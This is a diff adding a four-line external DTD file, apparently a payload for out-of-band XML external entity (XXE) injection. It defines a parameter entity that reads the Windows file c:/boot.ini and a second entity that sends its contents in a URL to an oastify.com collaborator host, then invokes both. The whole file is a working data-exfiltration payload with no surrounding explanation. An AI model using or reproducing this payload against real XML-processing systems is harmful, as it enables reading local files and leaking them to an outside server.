@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///c:/boot.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://sfbubnwkz1cd19i7siey7wpb42atypme.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
